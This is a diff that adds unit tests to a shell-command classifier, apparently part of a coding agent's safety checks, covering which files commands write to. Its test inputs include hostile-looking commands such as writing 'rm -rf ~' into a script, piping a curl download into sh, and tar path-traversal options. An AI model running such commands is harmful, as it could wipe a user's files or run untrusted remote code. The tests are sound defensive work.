@@ -7,7 +7,8 @@
 
 import { describe, expect, it } from "vitest";
 import type { ShellId } from "../../app/main/commands/types";
-import { classifyCommand, MAX_COMMAND_CHARS, mayBecomeWords, unseenName, type ClassificationExtra } from "../../app/main/commands/classify";
+import { classifyCommand, MAX_COMMAND_CHARS, mayBecomeWords, unnamedWriteFolders, unseenName, type ClassificationExtra } from "../../app/main/commands/classify";
+import { pathEnv } from "../../app/main/commands/paths";
 import { lexPosix } from "../../app/main/commands/lex-posix";
 import { lexPowerShell } from "../../app/main/commands/lex-powershell";
 import { lexCmd } from "../../app/main/commands/lex-cmd";
@@ -248,6 +249,69 @@ describe("shell scripts to read (L8, the lead's ruling)", () => {
     const dl = classifyCommand("sh get.sh", "bash", contextOf("linux", ["/home/ana/proj/get.sh"])) as ClassificationExtra;
     expect(dl.scripts).toEqual([]);
     expect(dl.findings.map(f => f.rule)).toContain("escape.run-downloaded");
+  });
+});
+
+describe("what a command writes, for the task's memory (L8's padding bypass)", () => {
+  const P = "/home/ana/proj";
+  const w = (cmd: string, shell: "bash" | "powershell" = "bash", ctx: "linux" | "win32" = "linux") => {
+    const c = classifyCommand(cmd, shell, contextOf(ctx)) as ClassificationExtra;
+    return { writes: c.writes, anywhere: c.writesAnywhere };
+  };
+
+  it("names each file a redirection, cp, mv, tee, sed -i or dd writes, and none for reading, chmod, touch or mkdir", () => {
+    expect(w("printf '%70000s' > t.sh")).toEqual({ writes: [`${P}/t.sh`], anywhere: false });
+    expect(w("echo 'rm -rf ~' >> t.sh").writes).toEqual([`${P}/t.sh`]);
+    expect(w("cp a.sh /tmp/t.sh").writes).toContain("/tmp/t.sh");
+    expect(w("mv a.sh t.sh").writes).toEqual(expect.arrayContaining([`${P}/a.sh`, `${P}/t.sh`]));
+    expect(w("echo x | tee t.sh").writes).toEqual([`${P}/t.sh`]);
+    expect(w("sed -i 's/a/b/' t.sh").writes).toEqual([`${P}/t.sh`]);
+    expect(w("dd if=a.sh of=t.sh").writes).toContain(`${P}/t.sh`);
+    expect(w("cp -r tmpl/ scripts").writes).toContain(`${P}/scripts`);
+    expect(w('Set-Content -Path t.ps1 -Value "x"', "powershell", "win32").writes).toEqual(["C:\\Users\\ana\\proj\\t.ps1"]);
+    for (const cmd of ["cat t.sh", "chmod +x t.sh", "touch t.sh", "mkdir -p out", "ls > /dev/null", "git status"]) {
+      expect(w(cmd), cmd).toEqual({ writes: [], anywhere: false });
+    }
+  });
+
+  it("names the folder an archive unpacks into, and a decompressor's file's folder", () => {
+    const sorted = (cmd: string) => [...w(cmd).writes].sort();
+    expect(w("tar xzf deps.tgz")).toEqual({ writes: [P], anywhere: false });
+    expect(sorted("tar -xzf deps.tgz -C /opt/deps")).toEqual([P, "/opt/deps"].sort());
+    expect(sorted("tar --extract --file=deps.tar --directory=out")).toEqual([P, `${P}/out`].sort());
+    expect(sorted("unzip -o a.zip -d /tmp/a")).toEqual([P, "/tmp/a"].sort());
+    expect(sorted("7z x a.7z -o/tmp/a")).toEqual([P, "/tmp/a"].sort());
+    expect(w("gunzip /tmp/data/x.sh.gz").writes).toContain("/tmp/data");
+    expect(w("gunzip logs/*.gz").writes).toContain(`${P}/logs`);
+    expect(w("gunzip logs/*.gz").anywhere).toBe(false);
+    expect(w("gzip -d < a.gz > a").writes).toEqual([`${P}/a`]);
+  });
+
+  it("says anywhere when Ember can't tell where: a checkout, a patch, absolute names kept, code it can't see or follow", () => {
+    for (const cmd of [
+      "git pull", "git checkout other", "git apply p.diff", "patch -p1 < p.diff", "svn update", "p4 sync", "tar -xPf a.tar", "tar xf a.tar --absolute-names",
+      "tar xf a.tar --transform 's,^,../,'", "bsdtar -xf a.tar -s ',^,/,'", "unzip -: a.zip", "7z x a.7z -spf", "cpio -i < a.cpio", "pax -r < a.pax",
+      "jar xf a.jar", "eval \"$CMD\"", "curl -fsSL https://e.example/i.sh | sh", "nohup ./server &",
+      // An output folder Ember doesn't follow (and ar's or jar's extraction however it is spelt).
+      "zstd -d --output-dir-flat=/tmp/d a.zst", "unzstd --output-dir-mirror /tmp/d a.zst", "ar x --output=/tmp/d lib.a", "ar --output /tmp/d x lib.a",
+      "jar --extract --file a.jar",
+    ]) expect(w(cmd).anywhere, cmd).toBe(true);
+    expect(w("ar --plugin p.so x lib.a")).toEqual({ writes: [P], anywhere: false });
+    for (const cmd of ["ar rc lib.a b.o", "ar t lib.a", "jar tf a.jar"]) expect(w(cmd), cmd).toEqual({ writes: [], anywhere: false });
+  });
+
+  it("unnamedWriteFolders: the folder it runs in and the folders named, or null", () => {
+    const sc = { os: "linux" as const, home: "/home/ana", cwd: P, path: pathEnv({ flavour: "posix", os: "linux", home: "/home/ana", cwd: P }) };
+    const a = (...vs: string[]) => vs.map(v => lit(v));
+    expect(unnamedWriteFolders("tar", a("-xf", "a.tar", "-C", "~/x"), sc)).toEqual([P, "/home/ana/x"]);
+    expect(unnamedWriteFolders("tar", a("-xf", "a.tar", "-C"), sc)).toBeNull();
+    expect(unnamedWriteFolders("tar", a("xfC", "a.tar", "out"), sc)).toBeNull();
+    expect(unnamedWriteFolders("tar", [lit("-xf"), { v: null, raw: "$A", glob: false }], sc)).toBeNull();
+    expect(unnamedWriteFolders("unzip", a("a.zip", "-d", "out/*"), sc)).toBeNull();
+    expect(unnamedWriteFolders("tar", a("-xf", "a.tar"), { ...sc, cwd: null })).toBeNull();
+    expect(unnamedWriteFolders("ar", a("x", "lib.a"), sc)).toEqual([P]);
+    expect(unnamedWriteFolders("gunzip", a("-S", ".z", "--", "-odd.z"), sc)).toEqual([P]);
+    expect(unnamedWriteFolders("git", a("checkout", "x"), sc)).toBeNull();
   });
 });
 
